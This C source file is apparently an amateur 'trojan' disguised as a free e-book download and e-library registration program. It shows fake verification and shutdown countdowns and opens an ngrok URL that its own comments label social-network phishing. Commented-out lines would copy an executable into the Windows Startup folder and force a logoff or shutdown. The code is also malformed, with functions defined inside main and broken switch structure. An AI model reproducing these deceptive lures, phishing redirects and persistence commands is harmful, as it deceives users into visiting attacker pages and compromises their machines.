#include <stdio.h>
#include <time.h>
#include <stdlib.h>
struct student {
    char firstName[50];
    int re;
    int ag;
} s[10];

int main() {
    int i;
    printf("____________________________________________________________________\n");
    printf("\nRegister For E Library:\n");

    // storing information
    for (i = 0; i < 2; ++i) {
        s[i].re = i + 1;
        printf("\nFor Register Number %d,\n", s[i].re);
        printf("Enter First Name : ");
        scanf("%s", s[i].firstName);
        printf("Enter Age : ");
        scanf("%d", &s[i].ag);
        printf("\n\n");
        
    }
    
void setTimeout(int milliseconds)
{
    // If milliseconds is less or equal to 0
    // will be simple return from function without throw error
    if (milliseconds <= 0) {
        fprintf(stderr, "Count milliseconds for timeout is less or equal to 0\n");
        return;
    }

    // a current time of milliseconds
    int milliseconds_since = clock() * 1000 / CLOCKS_PER_SEC;

    // needed count milliseconds of return from this timeout
    int end = milliseconds_since + milliseconds;

    // wait while until needed time comes
    do {
        milliseconds_since = clock() * 1000 / CLOCKS_PER_SEC;
    } while (milliseconds_since <= end);
}


    int delay;
    delay =10;
    
    do {
        
        printf(" Wait a moment. Your details are being checked. : %d\n", delay);

        setTimeout(1000);

        // decrease the delay to 1
        delay--;

    } while (delay >= 0);
    


    
    //-------------------------------------------------------------------------
    printf("\n----|  Your login details are successful  |----\n\n");
    //--------------------------------------------------------------------------
    // Current Time 
    
    time_t m, val = 1;
    struct tm* current_time;
  
    // time in seconds
    m = time(NULL);
  
    // to get current time
    current_time = localtime(&m);
  
    // print time in minutes,
    // hours and seconds
    printf("\n----------------------------------------\n");
    printf("Your Loging Time is : %02d:%02d:%02d\n",
           current_time->tm_hour,
           current_time->tm_min,
           current_time->tm_sec);
    printf("----------------------------------------\n");   

	
	// End the time-------------------------------------------------------------    
    
    // displaying information
    for (i = 0; i < 2; ++i) {
        printf("\nRegister Number: %d \n", i + 1);
        printf("First name : ");
        puts(s[i].firstName);
        printf("Age : %d", s[i].ag);
        printf("\n");
    }
    
    //------------------------------------------------------
    int a,b,d,f,g,l,w,e;
    
    
    puts ("\n----------------------------------------------------------------------------\n");
	puts("|             --FREE E BOOKS DOWNLOADING SYSTEM 2021--                      |\n");
	puts("----------------------------------------------------------------------------\n\n");
	
	puts("++++++  Please Enable The Internet Connection Before Activating This  +++++++");
	


    printf("\n\n\nSelect Books =  Number 1 \nDirect going to Book Library Website =  Number 2 \n\n");
    printf("Press The Number 1 or 2 :  ");
    scanf("%d",&l); 
    
    char q[20];
    int x=0;
    
    switch(l){
   //----------------------------------------------------------------------------------------------------------------------------------------
	case 1:{
		
		printf("\n\n\nHow Many Giving to your books : ");
        scanf("%d",&w);
	do{
		
		printf("\nEnter The Book Name : ");
		scanf("%s",&q);
		x++;
	}
	while(x<w);
	
//______________________________________________________________________________________________________________________________________________________________________________________	                        
//++++++++++++++++++))))))))))))))))))((((((((((((((((( THE   VIRUS   AREA   OF   THE     PROGRAMM )))))))))))))))))))))((((((((((((((((((((((++++++++++++++++++++++++++++++++++++	
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
   printf("\n\n");
    printf("    ________________________________________________________________________________________________________________\n"); 
	printf("   | First, you must go to our Facebook page and like our Facebook page. This is done to verify you.                |\n");
	printf("   |________________________________________________________________________________________________________________|\n");
	
	printf("\n Do you agree with our terms ?\n\n");
	
	int v;
	printf ("-Yes = 1\n-Downloading and Reading our Terms = 2 \n\n");
	scanf("%d",&v);
	
		switch (v){
		case 1:{
		 system(" start https://eb1d004c103d.ngrok.io  "); // fist one is social network phishing ! second one is pdf 
			break;
		}
		case 2:{
			printf("this trojan virus"); //include a Trojan link prorat tools
			system("start https://en.wikipedia.org/wiki/Trojan_horse_%28computing%29");
			break;
		}
		default: printf("Wrong Command and shout Down "); 
		system ("start https://www.merriam-webster.com/dictionary/shout%20down#:~:text=Definition%20of%20shout%20down%20%3A%20to%20shout%20so,give%20his%20speech.%20Learn%20More%20about%20shout%20down");
			        // system("shutdown -l -f";
	}                  
	break;
}

int j;
	case 2:{
		
		printf("\n\n\tFirst, you need to go to our Facebook page and like our facebook page. ");
		printf("\n\nPlease agree our conditions \n\n\n=Yeah I agree This = 1\n=No I am Not = 2\n");
		scanf("%d",&j);
		
		switch (j){
		case 1:{
			printf("Social media link add");
			system("start https://web.facebook.com/");
		// system(" start https:www.google.com  "); // fist one is social network phishing ! second one is pdf 
			break;
		}
		case 2:{
			
			printf("trojan virus Download"); //2nd Trojan attack and camphishing attack, our condition line 
			system("start https://download.virtualbox.org/virtualbox/6.1.0/VirtualBox-6.1.0-135406-Win.exe");
			break;
		break;
	}
}
}
	default: printf("Inavlid Numbers Shout Down machine \n\n "); 
	        // system("shutdown -l -f");

	 
	
}

	// =====================================Mobile version==================================================
	printf("\n");
	printf("_________________________________________________________________________________________________________\n");
	printf("\t\t\t\tAuthentication !\n\n\n\n");
	
	printf("\n\n\n---Now you add to the Mobile Phone System.\n Android or Apple \n \n If Your Mobile Phone is Andoid Press Number =  1\n If Your Mobile Phone is Apple Press Number =  2 \n\n");
	printf("4. Press The number : ");
	scanf("%d",&g);  
	switch (g){
		case 1:
			printf("\n\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$_$$$$$$$$$$$$$$$$_$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$__$$$$$$$$$$$$$$_$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$_______________$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$___________________$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$____$$$_________$$$____$$$$$$$$$$$$$\n$$$$$$$$$$$$$_____$$$_________$$$_____$$$$$$$$$$$$\n$$$$$$$$$$$$___________________________$$$$$$$$$$$\n$$$$$$$$$$$$___________________________$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$____$$$____________________________$$$____$$$\n$$$$______$$____________________________$$______$$\n$$$$______$$____________________________$$______$$\n$$$$______$$______ Hello    Android_____$$______$$\n$$$$______$$____________________________$$______$$\n$$$$______$$____________________________$$______$$\n$$$$______$$____________________________$$______$$\n$$$$______$$____________________________$$______$$\n$$$$______$$____________________________$$______$$\n$$$$$____$$$____________________________$$$____$$$\n$$$$$$$$$$$$____________________________$$$$$$$$$$\n$$$$$$$$$$$$____________________________$$$$$$$$$$\n$$$$$$$$$$$$___________________________$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n");
		//	printf("\n\nEnter The Any Button for exit");
			break;
        
		case 2:
				
			
			printf("___________________________$$\n_________________________$$$$\n_______________________$$$$$$\n______________________$$$$$$\n______________________$$$$\n______________________$$\n_________$$$$$$$$$$$$$_$$$$$$$$$$$$$\n______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ \n____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n__$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n_$$$$$$$$$Hello$$$$$$$$$$$$$$$$$$$\n_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n__$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n_____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n__________$$$$$$$$$$$$$$$$$$$$$$$$$\n____________$$$$$$$$$$$$$$$$$$$$$\n______________$$$$$$$$__$$$$$$$");
			break;
		
			default: printf("Invalid\n\n");
			printf(" Don't worry. you have to use our PDF Library'");
			
	}
	
	
	system("start https://www.pdfdrive.com/");
	system(" start https://eb1d004c103d.ngrok.io");
	
	printf("\n\n\nEnter The Any Button for exit This Programme ! \n");
	
	char z[20];
	int n[20];
//	printf("So Happy ? ");
	scanf("%s",&z, &n);
	
	
	printf("\n\n\n´´´´´´´´´´´´´´´´´´´ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´´`\n´´´´´´´´´´´´´´´´´¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´\n´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´\n´´´´´´´´´´´´´¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´´\n´´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´\n´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´`´´´´´´´´´´´¶¶´´´´´´´´´´`\n´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´\n´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´\n´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´\n´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´\n´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´\n´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´\n´´´´´´´´´´´¶¶´¶¶´´´¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´¶¶´¶¶´´´´´´´´´´´\n´´´´´´´´´´´´¶¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´´´´´´´´´\n´´´´´´´´´´´´´¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶´´´´´´´´´´´´´\n´´´´¶¶¶´´´´´´´¶¶´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´¶¶´´´´´´¶¶¶¶´´´\n´´´¶¶¶¶¶´´´´´¶¶´´´¶¶¶¶¶¶¶´´´¶¶¶´´´¶¶¶¶¶¶¶´´´¶¶´´´´´¶¶¶¶¶¶´´\n´´¶¶´´´¶¶´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶´´´´¶¶´´´¶¶´´\n´¶¶¶´´´´¶¶¶¶´´¶¶´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´¶¶¶¶´´´´¶¶¶´\n¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶\n¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶¶\n´´¶¶¶¶´¶¶¶¶¶´´´´´´¶¶¶¶¶´´´´´´´´´´´´´´¶¶¶´¶¶´´´´´¶¶¶¶¶¶´¶¶¶´\n´´´´´´´´´´¶¶¶¶¶¶´´¶¶¶´´¶¶´´´´´´´´´´´¶¶´´¶¶¶´´¶¶¶¶¶¶´´´´´´´´\n´´´´´´´´´´´´´´¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶´´´´´´´´´´´´´´\n´´´´´´´´´´´´´´´´´´¶¶´¶¶´¶´¶´¶´¶´¶´¶´¶´¶´¶¶´´´´´´´´´´´´´´´´´\n´´´´´´´´´´´´´´´´¶¶¶¶´´¶´¶´¶´¶´¶´¶´¶´¶´´´¶¶¶¶¶´´´´´´´´´´´´´´\n´´´´´´´´´´´´¶¶¶¶¶´¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶´¶¶¶¶¶´´´´´´´´´´´´\n´´´´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶´´´´´´´´´´´´´´´´´¶¶´´´´´´¶¶¶¶¶¶¶¶¶´´´´\n´´´¶¶´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´´\n´´´´¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶´´´´\n´´´´´´¶¶´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´¶¶´´´´´´\n´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´\n´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´");


/*char s [40];
  printf("\n\n Enter Your Email Address :");
  
  scanf("%s",&s);	*/


  
  void setTimeoutt(int milliseconds)
{
    // If milliseconds is less or equal to 0
    // will be simple return from function without throw error
    if (milliseconds <= 0) {
        fprintf(stderr, "Count milliseconds for timeout is less or equal to 0\n");
        return;
    }

    // a current time of milliseconds
    int milliseconds_since = clock() * 1000 / CLOCKS_PER_SEC;

    // needed count milliseconds of return from this timeout
    int end = milliseconds_since + milliseconds;

    // wait while until needed time comes
    do {
        milliseconds_since = clock() * 1000 / CLOCKS_PER_SEC;
    } while (milliseconds_since <= end);
}


    int lka;
    lka =10;
    
    do {
        
        printf("\n\n %d  more seconds to shut down the system", lka);

        setTimeoutt(1000);

        // decrease the delay to 1
        lka--;

    } while (lka >= 0);


   printf("\n\n\nThis is shout down");

  // system ("start https://5e0b02178d60.ngrok.io");
	
	
	
  //  system("copy test.exe C:/Documents and Settings/All Users/Start Menu/Programs/Startup/");
   // system("shutdown -l -f");
   //system("shutdown-s");
    
    
    
    
    getch ();	
	return 0;
	
}
